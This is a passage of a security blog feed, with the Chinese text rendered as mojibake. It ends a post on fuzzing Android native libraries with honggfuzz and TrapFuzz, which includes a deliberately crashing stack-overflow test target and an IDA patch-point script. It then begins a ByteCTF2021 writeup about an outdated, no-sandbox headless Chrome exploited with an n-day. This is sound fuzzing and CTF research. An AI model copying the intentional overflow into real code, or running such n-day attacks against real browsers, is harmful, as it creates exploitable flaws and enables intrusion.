1\\n&quot;</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fread(&amp;c, 1, 1, fp) != 1) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error reading file\\n&quot;</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (c != <span class="string">&#x27;e&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error 2\\n&quot;</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fread(&amp;c, 1, 1, fp) != 1) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error reading file\\n&quot;</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (c != <span class="string">&#x27;s&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error 3\\n&quot;</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fread(&amp;c, 1, 1, fp) != 1) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error reading file\\n&quot;</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (c != <span class="string">&#x27;t&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error 4\\n&quot;</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;!!!!!!!!!!OK!!!!!!!!!!\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fread(&amp;c, 1, 1, fp) != 1) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error reading file\\n&quot;</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">        // cause a crash</span><br><span class="line">        crash[0] = 1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;2&#x27;</span>) &#123;</span><br><span class="line">        char buffer[5] = &#123; 0 &#125;;</span><br><span class="line">        // stack-based overflow to trigger the GS cookie corruption</span><br><span class="line">        <span class="keyword">for</span> (int i = 0; i &lt; 5; ++i)</span><br><span class="line">            strcat(buffer, argv_0);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;buffer: %s\\n&quot;</span>, buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error 5\\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc &lt; 2) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;input file&gt;\\n&quot;</span>, argv[0]);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        //regular single target call</span><br><span class="line">    <span class="built_in">return</span> test_target(argv[1], argv[0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ndkæ„å»ºå‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ndk-build NDK_PROJECT_PATH=. NDK_APPLICATION_MK=Application.mk TARGET_ARCH_ABI=arm64-v8a</span><br></pre></td></tr></table></figure><h2 id="write-harness-for-so"><a href="#write-harness-for-so" class="headerlink" title="write harness for .so"></a>write harness for <code>.so</code></h2><h3 id="ä½¿ç”¨native-harness-target"><a href="#ä½¿ç”¨native-harness-target" class="headerlink" title="ä½¿ç”¨native-harness-target"></a>ä½¿ç”¨native-harness-target</h3><p>å‚è€ƒé¡¹ç›® : <a href="https://github.com/CalebFenton/native-harness-target">https://github.com/CalebFenton/native-harness-target</a></p><p>Android 7.1.1</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824225812164.png" alt="image-20220824225812164"></p><p>å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹å¼è·‘èµ·æ¥ï¼Œä¸è¿‡é€Ÿåº¦åŠå…¶çš„æ…¢ã€‚</p><p><strong>TODO :</strong></p><ol><li>é€Ÿåº¦é—®é¢˜ï¼Œè€ƒè™‘docker Androidæˆ–è€…qemu-kvm</li><li>port åˆ° Android 10</li></ol><p>Android 10 :</p><p><a href="https://github.com/rednaga/native-shim">rednaga/native-shim</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=`<span class="built_in">pwd</span>`:/apex/com.android.runtime/lib::<span class="variable">$LD_LIBRARY_PATH</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=`<span class="built_in">pwd</span>`:/apex/com.android.runtime/lib64:<span class="variable">$LD_LIBRARY_PATH</span></span><br><span class="line">255|walleye:/data/<span class="built_in">local</span>/tmp <span class="comment"># ./shim libstr-crypt.so</span></span><br><span class="line">[*] native-shim - diff</span><br><span class="line"> [+] Attempting to load : [ libstr-crypt.so ]</span><br><span class="line"> [+] Library Loaded!</span><br><span class="line"> [+] Initializing JavaVM Instance</span><br><span class="line"> [+] Initialization success (vm=0x74eb6901c0, env=0x74eb6e06c0)</span><br><span class="line"> [+] Found JNI_OnLoad, attempting to call</span><br><span class="line"> [+] Closing library</span><br><span class="line">walleye:/data/<span class="built_in">local</span>/tmp <span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="libpl-droidsonroids-gif-soæµ‹è¯•"><a href="#libpl-droidsonroids-gif-soæµ‹è¯•" class="headerlink" title="libpl_droidsonroids_gif.soæµ‹è¯•"></a>libpl_droidsonroids_gif.soæµ‹è¯•</h3><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824225828132.png" alt="image-20220824225828132"></p><h2 id="work-with-honggfuzz"><a href="#work-with-honggfuzz" class="headerlink" title="work with honggfuzz"></a>work with honggfuzz</h2><blockquote><p>ç»å…¸çš„ patch è·³è½¬æŒ‡ä»¤ï¼Œå®ç°ä¸€ä¸ªdebuggeræ¥è·å–è¦†ç›–ç‡çš„æ–¹æ¡ˆ</p></blockquote><ul><li><p>ä½¿ç”¨ä¹‹å‰ patchè·³è½¬çš„æ–¹å¼æè¦†ç›–ç‡ï¼Œä¿®æ”¹honggfuzzå³å¯</p><p>é—®é¢˜ ï¼š åˆ›å»ºJVMç›¸å…³çš„æ“ä½œè€—æ—¶ï¼Œå½±å“æ•ˆç‡</p></li><li><p>ä¸ºäº†è§£å†³æ•ˆç‡é—®é¢˜ï¼Œå¦‚æœå¯ä»¥è‡ªå·±å†™ä¸€ä¸ªï¼Œåˆå§‹åŒ–ä¹‹åï¼Œforkï¼Œç„¶åç–¯ç‹‚æforkå‡ºæ¥çš„å­è¿›ç¨‹å³å¯ï¼Œè¿™æ ·æ•ˆç‡å°±ä¸Šå»äº†ã€‚</p></li></ul><h3 id="get-all-JUMP-INS"><a href="#get-all-JUMP-INS" class="headerlink" title="get all JUMP INS"></a>get all JUMP INS</h3><p>è·å–patchéœ€è¦patchçš„æŒ‡ä»¤åœ°å€ï¼Œç›´æ¥ä»p0toolsé‡ŒæŠ„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> ida_nalt</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line"><span class="comment"># See &lt;https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> expanduser</span><br><span class="line">home = expanduser(<span class="string">&quot;~&quot;</span>)</span><br><span class="line"></span><br><span class="line">patchpoints = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">max_offset = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> seg_ea <span class="keyword">in</span> idautils.Segments():</span><br><span class="line">    name = idc.get_segm_name(seg_ea)</span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">&quot;.text&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    start = idc.get_segm_start(seg_ea)</span><br><span class="line">    end = idc.get_segm_end(seg_ea)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(start), <span class="built_in">hex</span>(end))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> func_ea <span class="keyword">in</span> idautils.Functions(start, end):</span><br><span class="line">        f = idaapi.get_func(func_ea)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> f:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> idaapi.FlowChart(f):</span><br><span class="line">            <span class="keyword">if</span> start &lt;= block.start_ea &lt; end:</span><br><span class="line">                max_offset = <span class="built_in">max</span>(max_offset, block.start_ea)</span><br><span class="line">                patchpoints.add(block.start_ea)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Warning, broken CFG?&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Round up max_offset to page size</span></span><br><span class="line">size = max_offset</span><br><span class="line">rem = size % <span class="number">0x1000</span></span><br><span class="line"><span class="keyword">if</span> rem != <span class="number">0</span>:</span><br><span class="line">    size += <span class="number">0x1000</span> - rem</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(home + <span class="string">&quot;/Desktop/patches.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(ida_nalt.get_root_filename() + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">hex</span>(size) + <span class="string">&#x27;\\n&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&#x27;\\n&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">hex</span>, <span class="built_in">sorted</span>(patchpoints))))</span><br><span class="line">    f.write(<span class="string">&#x27;\\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Done, found &#123;&#125; patchpoints&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(patchpoints)))</span><br></pre></td></tr></table></figure><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824230049472.png" alt="image-20220824230049472"></p><h3 id="Patch-or-hook-INS"><a href="#Patch-or-hook-INS" class="headerlink" title="Patch or hook INS"></a>Patch or hook INS</h3><p>é—®é¢˜ ï¼š éœ€è¦æƒ³åŠæ³•åšåˆ° hfuzzccä¸€æ ·çš„æ•ˆæœï¼Œå³ æŠŠ libhfuzz.a é“¾æ¥è¿›ç›®æ ‡binaryï¼Œä¸ç„¶æ²¡æœ‰æ¡©ä¿¡æ¯ã€‚</p><ul><li>çœ‹çœ‹hfuzzccæ˜¯æ€ä¹ˆå·¥ä½œçš„</li></ul><p>çœ‹èµ·æ¥å°±æ˜¯ä¸€å±‚wrapperï¼Œç»™clang/gccç¼–è¯‘çš„æ—¶å€™å¢åŠ äº† <code>CFLAGS</code> å’Œ <code>LDFLAGS</code>ï¼Œçœ‹èµ·æ¥åªéœ€è¦æŒ‰ç…§éœ€æ±‚æŠŠå‚æ•°æ”¾åˆ° <code>Android.mk</code>å³å¯ã€‚</p><p>è¿™é‡Œå‚è€ƒImageIOä¾‹å­ä¸­çš„ç¼–è¯‘çš„å‚æ•°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">cc</span><br><span class="line">-I/Users/vuln_test/honggfuzz/includes/</span><br><span class="line">-Wno-unused-command-line-argument</span><br><span class="line">-fsanitize-coverage=trace-pc-guard,trace-cmp,trace-div,indirect-calls</span><br><span class="line">-mllvm</span><br><span class="line">-sanitizer-coverage-prune-blocks=1</span><br><span class="line">-fno-inline</span><br><span class="line">-fno-builtin</span><br><span class="line">-fno-omit-frame-pointer</span><br><span class="line">-D__NO_STRING_INLINES</span><br><span class="line"></span><br><span class="line">-DHFND_FUZZING_ENTRY_FUNCTION_CXX(x,y)=extern const char* LIBHFNETDRIVER_module_netdriver;const char** LIBHFNETDRIVER_tmp1 = &amp;LIBHFNETDRIVER_module_netdriver;extern <span class="string">&quot;C&quot;</span> int HonggfuzzNetDriver_main(x,y);int HonggfuzzNetDriver_main(x,y)</span><br><span class="line"></span><br><span class="line">-DHFND_FUZZING_ENTRY_FUNCTION(x,y)=extern const char* LIBHFNETDRIVER_module_netdriver;const char** LIBHFNETDRIVER_tmp1 = &amp;LIBHFNETDRIVER_module_netdriver;int HonggfuzzNetDriver_main(x,y);int HonggfuzzNetDriver_main(x,y)</span><br><span class="line"></span><br><span class="line">-Wl,-U,_HonggfuzzNetDriver_main</span><br><span class="line">-Wl,-U,_LIBHFUZZ_module_instrument</span><br><span class="line">-Wl,-U,_LIBHFUZZ_module_memorycmp</span><br><span class="line">**-o</span><br><span class="line">runner**</span><br><span class="line">**runner.m**</span><br><span class="line">-framework</span><br><span class="line">Foundation</span><br><span class="line">-framework</span><br><span class="line">CoreGraphics</span><br><span class="line">-framework</span><br><span class="line">AppKit</span><br><span class="line">/tmp/libhfnetdriver.501.7140081f7cd58e92.a</span><br><span class="line">/tmp/**libhfuzz**.501.2fdc27091cd8b54d.a</span><br><span class="line">/tmp/libhfuzz.501.a5556386f906dc80.a</span><br><span class="line">-pthread</span><br><span class="line">-ldl</span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_STATIC_LIBRARIES := hfuzz hfuzzcommon </span><br><span class="line">LOCAL_SRC_FILES := fuzz_test.c</span><br><span class="line">LOCAL_MODULE := fuzz_test</span><br><span class="line">LOCAL_CFLAGS :=  -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-div,indirect-calls \\</span><br><span class="line">                 -fno-omit-frame-pointer -fno-inline -fno-builtin \\</span><br><span class="line">                 -fno-omit-frame-pointer -Wl,-u,_LIBHFUZZ_module_instrument -Wl,-u,_LIBHFUZZ_module_memorycmp -ldl</span><br><span class="line"></span><br><span class="line">LOCAL_LDFLAGS :=  -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-div,indirect-calls \\</span><br><span class="line">                   -fno-inline -fno-builtin \\</span><br><span class="line">                   -fno-omit-frame-pointer -Wl,-u,_LIBHFUZZ_module_instrument -Wl,-u,_LIBHFUZZ_module_memorycm</span><br></pre></td></tr></table></figure><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824230115528.png" alt="image-20220824230115528"></p><p>harnessé‡Œéœ€è¦ä¸»åŠ¨è°ƒç”¨ <code>initializeTrapfuzz()</code></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824230125768.png" alt="image-20220824230125768"></p><p>çœ‹èµ·æ¥ä¸€åˆ‡éƒ½ä¸é”™ï¼</p><p>è·å–æŒ‡å®šsoåœ°å€ä¹Ÿæœ‰äº†ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824230138101.png" alt="image-20220824230138101"></p><ul><li>Patch</li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824230152707.png" alt="image-20220824230152707"></p><p>å‚è€ƒè¿™é‡Œä¿®æ”¹honggfuzzçš„ä»£ç å³å¯</p><h2 id="åç»­-amp-é—®é¢˜"><a href="#åç»­-amp-é—®é¢˜" class="headerlink" title="åç»­&amp;é—®é¢˜"></a>åç»­&amp;é—®é¢˜</h2><p>è¿™ä¸ªæ–¹æ¡ˆä¸»è¦æ˜¯æ•ˆç‡å®åœ¨æ˜¯å¤ªå·®äº†ï¼Œæ€§èƒ½æŸè€—éƒ½åœ¨jvmè·å–é‚£é‡Œäº†ï¼Œæœ¬æ¥ä¹Ÿæ˜¯å·¥ä½œä¹‹ä½™çš„ä¸€ä¸ªå°ç‚¹å­ï¼Œåé¢ä¹Ÿæ²¡æ·±å…¥å»çœ‹äº†ï¼Œä¸ªäººæœ€å¼€å§‹çš„æƒ³æ³•æ˜¯ winaflæ¨¡å¼æ¬åˆ°å®‰å“ä¸Š lolâ€¦</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://googleprojectzero.blogspot.com/2020/04/fuzzing-imageio.html">https://googleprojectzero.blogspot.com/2020/04/fuzzing-imageio.html</a></p><p><a href="https://github.com/googleprojectzero/p0tools/blob/master/TrapFuzz/trapfuzz.patch">https://github.com/googleprojectzero/p0tools/blob/master/TrapFuzz/trapfuzz.patch</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;&lt;h2 id=&quot;Background&quot;&gt;&lt;a href=&quot;#Background&quot; class=&quot;headerlink&quot; title=&quot;Background&quot;&gt;&lt;/a&gt;Background&lt;/h2&gt;&lt;p&gt;TrapFuzzçš„æ€è·¯Fuzzing Android nativeåº“ï¼Œè¿™å°±æ˜¯ä¸ªç®€å•çš„Demoï¼Œåªé’ˆå¯¹é»‘ç›’çš„åº“ã€‚&lt;/p&gt;</summary>
    
    
    
    
    <category term="Android" scheme="https://o0xmuhe.github.io/tags/Android/"/>
    
    <category term="native" scheme="https://o0xmuhe.github.io/tags/native/"/>
    
    <category term="jni" scheme="https://o0xmuhe.github.io/tags/jni/"/>
    
    <category term="honggfuzz" scheme="https://o0xmuhe.github.io/tags/honggfuzz/"/>
    
    <category term="trapfuzz" scheme="https://o0xmuhe.github.io/tags/trapfuzz/"/>
    
  </entry>
  
  <entry>
    <title>ByteCTF2021 chatroom writeup</title>
    <link href="https://o0xmuhe.github.io/2021/10/17/ByteCTF2021-chatroom-writeup/"/>
    <id>https://o0xmuhe.github.io/2021/10/17/ByteCTF2021-chatroom-writeup/</id>
    <published>2021-10-17T10:10:17.000Z</published>
    <updated>2021-10-18T13:09:35.058Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>  åœ¨ä»Šå¹´çš„ByteCTFä¸­ï¼Œæˆ‘å‡ºäº†ä¸€é“pwné¢˜ç›®ï¼Œè·ç¦»ä¸Šä¸€æ¬¡æ‰“æ¯”èµ›/å‡ºé¢˜å·²ç»è¿‡å»å¾ˆä¹…äº†ï¼Œæ‰€ä»¥ä¼ ç»Ÿçš„ <code>heap trick</code> å°±æ²¡æœ‰è€ƒè™‘ï¼Œè€Œæ˜¯ä»æˆ‘æ—¥å¸¸å·¥ä½œä¸­æŒ–æ˜çš„å®‰å…¨é£é™©å…¥æ‰‹ï¼Œç®€åŒ–åœºæ™¯ï¼Œå‡ºäº†ä¸€é“ <code>chatroom</code> ï¼Œçœ‹èµ·æ¥åƒä¸€ä¸ªwebçš„å¥‡æ€ªé¢˜ç›®ã€‚</p> <span id="more"></span><p>  è¿™ä¸ªé¢˜ç›®å…¶å®èƒŒåæ˜¯ <code>Headless Chrome</code> ç›¸å…³çš„pwnï¼Œæˆ‘æ—©æœŸçš„ä¸€ç¯‡åšå®¢å…¶å®å·²ç»é˜è¿°è¿‡ç›¸å…³é£é™©ï¼Œå¯ä»¥å‚è€ƒ <a href="https://o0xmuhe.github.io/2021/05/26/Chrome-headless-exploit/">Exploit Headless Chrome</a>ã€‚ å…¶å®è¿™ä¸ªé£é™©æš´éœ²å‡ºæ¥çš„ä¸ä»…ä»…æ˜¯ï¼šä½ç‰ˆæœ¬ã€è¯¯ç”¨å‚æ•° è¿™ä¸¤ä¸ªæ˜¾è€Œæ˜“è§çš„é—®é¢˜ï¼Œå…¶èƒŒåçš„åŸå› æ˜¯ä¸€äº›ä¸å¥½çš„ç¼–ç¨‹ä¹ æƒ¯è¢«é”™è¯¯åœ°ä¼ æ’­ï¼šå¤§å®¶éƒ½åœ¨ç”¨ <code>--no-sandbox</code> å‚æ•°ï¼Œå¥½åƒ <code>it works</code>å°±å¤Ÿäº†ï¼Œä½†æ˜¯åœ¨å®é™…åœºæ™¯ä¸­ï¼Œè¿™æ˜¯å¾ˆå±é™©çš„ã€‚</p><h2 id="é¢˜ç›®è®¾è®¡æ€è·¯"><a href="#é¢˜ç›®è®¾è®¡æ€è·¯" class="headerlink" title="é¢˜ç›®è®¾è®¡æ€è·¯"></a>é¢˜ç›®è®¾è®¡æ€è·¯</h2><p>  æˆ‘çš„æœ¬æ„æ˜¯è®¾è®¡ä¸€ä¸ªç±»ä¼¼èŠå¤©å®¤çš„åœºæ™¯ï¼Œç”¨æˆ·å¯ä»¥åœ¨èŠå¤©å®¤å†…å‘é€æ¶ˆæ¯ã€å¤šåª’ä½“æ–‡ä»¶ã€é“¾æ¥ç­‰ï¼Œå°½å¯èƒ½æ¨¡æ‹Ÿä¸€ä¸ªçœŸå®åœºæ™¯ã€‚ å¤„äºé£æ§è€ƒè™‘ï¼Œå¯¹äºéç™½åå•çš„é“¾æ¥ï¼Œéœ€è¦è¿›è¡Œæ£€æŸ¥ï¼ˆæ˜¯å¦æ¶æ„ï¼Œè‰²æµç­‰ï¼‰ã€‚å¯¹äºURL æ£€æŸ¥çš„é€»è¾‘ï¼Œæœ€å¥½æ˜¯æœåŠ¡ç«¯æ¥æ”¶åˆ°å†…å®¹ä¹‹åï¼Œåˆ¤æ–­æ˜¯å¦æ˜¯URLï¼Œéšåé€šè¿‡RPCè°ƒç”¨èµ°åˆ°URLæ£€æŸ¥çš„æœåŠ¡å»ã€‚ä½†æ˜¯è€ƒè™‘åˆ°å®é™…é¢˜ç›®ï¼Œæˆ‘å¤§å¤§ç®€åŒ–äº†è¿™ä¸ªåœºæ™¯ï¼Œç›´æ¥æŠŠæ£€æŸ¥æ”¾åœ¨å‰ç«¯äº†ï¼Œè€Œä¸”æˆ‘æ²¡æœ‰æ··æ·†JSï¼Œæ‰€ä»¥å¯ä»¥å¾ˆç›´æ¥çœ‹åˆ°ä¸€ä¸ªHTTPè¯·æ±‚ã€‚</p><p>  è§£å†³äº†åœºæ™¯é—®é¢˜ï¼ŒèŠå¤©å®¤éƒ¨åˆ†ç›´æ¥ç”¨äº†githubçš„å¼€æºé¡¹ç›® <a href="https://github.com/cleverqin/node-websocket-Chatroom">node-websocket-Chatroom</a>ï¼Œåç«¯ä½¿ç”¨ puppeteeræ¥æŠ“å–ç”¨æˆ·çš„URLã€‚</p><p>ä¸ºäº†æå‡ä¸€äº›éš¾åº¦ï¼ŒåŒæ—¶è¿™ä¹Ÿæ˜¯æˆ‘æ›¾ç»é‡åˆ°è¿‡çš„é—®é¢˜ï¼šUAä¸å¯é çš„æƒ…å†µä¸‹æ€ä¹ˆåˆ¤æ–­Chromeç‰ˆæœ¬ï¼Ÿ</p><p>æ‰€ä»¥æˆ‘ç›´æ¥åœ¨å¯åŠ¨å‚æ•°é‡ŒæŠŠUAç»™æ”¹äº†ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123; </span><br><span class="line">   <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>, <span class="string">&#x27;--disable-setuid-sandbox&#x27;</span>, </span><br><span class="line">          <span class="string">&#x27;--user-agent=&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)</span></span><br><span class="line"><span class="string">           AppleWebKit/537.36 (KHTML, like Gecko) Chrome/1337.13.37.0  Safari/4141.42&quot;&#x27;</span>], </span><br><span class="line"><span class="attr">ignoreHTTPSErrors</span>: <span class="literal">true</span>, <span class="attr">dumpio</span>: <span class="literal">false</span> &#125;);</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆé¢˜ç›®æˆå‹ï¼š</p><ul><li>éæœ€æ–°ç‰ˆæœ¬puppeteer</li><li>â€“no-sandbox</li><li>UAä¸å‡†ç¡®</li></ul><h2 id="Writeup-amp-éé¢„æœŸ"><a href="#Writeup-amp-éé¢„æœŸ" class="headerlink" title="Writeup &amp; éé¢„æœŸ"></a>Writeup &amp; éé¢„æœŸ</h2><h3 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h3><p>ä¸»è¦æ˜¯ <a href="https://twitter.com/zh1x1an2">zh1x1an2</a> åŒå­¦çš„åšæ³•ï¼ŒExploitç‹‚è½°æ»¥ç‚¸æœ¯ï¼ŒæŒ¨ä¸ªæŒ¨ä¸ªæ¥ï¼Œæœ€ç»ˆæ‹¿åˆ°flagã€‚</p><h3 id="é¢„æœŸ"><a href="#é¢„æœŸ" class="headerlink" title="é¢„æœŸ"></a>é¢„æœŸ</h3><p>UAä¸å¯ä¿¡ï¼Œä½†æ˜¯V8 å’Œ Blinkæ˜¯å¯ä¿¡çš„ï¼Œä¸åŒChromeç‰ˆæœ¬ä¼šæœ‰ä¸åŒçš„featuresï¼Œæ‰€ä»¥å¯ä»¥å€ŸåŠ©è¿™ä¸ªç‚¹ï¼Œåˆ¤æ–­ä¸€ä¸ªå¤§ç‰ˆæœ¬ï¼Œä¾¿äºåç»­åšåˆ©ç”¨ã€‚</p><p>å‚è€ƒ : <a href="https://chromestatus.com/features">https://chromestatus.com/features</a> </p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/chrome_features.png" alt="chrome_features"></p><p>ä¸è¿‡è¿™ä¸ªéœ€è¦ä¸€äº›ç§¯ç´¯ &amp;&amp; æµ‹è¯•  :)</p><p>éšååˆ¤æ–­å‡ºæ¥ç‰ˆæœ¬æ˜¯ M88 ä¹‹åï¼Œæ‰¾ä¸ªåˆé€‚çš„ndayå°±å¯ä»¥æ‰“äº† : )</p><h2 id="é¢˜ç›®ç¯å¢ƒ"><a href="#é¢˜ç›®ç¯å¢ƒ" class="headerlink" title="é¢˜ç›®ç¯å¢ƒ"></a>é¢˜ç›®ç¯å¢ƒ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 